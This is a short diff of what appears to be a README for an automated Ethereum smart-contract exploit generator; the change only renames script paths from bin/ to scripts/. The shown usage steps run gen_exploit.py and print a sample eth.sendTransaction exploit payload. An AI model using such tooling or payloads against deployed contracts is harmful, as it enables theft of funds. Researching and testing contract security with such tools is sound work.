@@ -60,12 +60,12 @@ $ solc --bin test.sol | tail -n1 > test.code
 
 4. Extract the deployed contract code
 ```
-$ python bin/extract_contract_code.py test.code > test.contract.code
+$ python scripts/extract_contract_code.py test.code > test.contract.code
 ```
 
 5. Generate an exploit
 ```
-$ python bin/gen_exploit.py test.contract.code 0x1234 0x1000 +1000
+$ python scripts/gen_exploit.py test.contract.code 0x1234 0x1000 +1000
 
 ...
 eth.sendTransaction({from:"0x0000000000000000000000000000000000001234", data:"0x7cb97b2b0000000000000000000000000000000000000000000000000000000000001234", to:"0x4000000000000000000000000000000000000000", gasPrice:0})
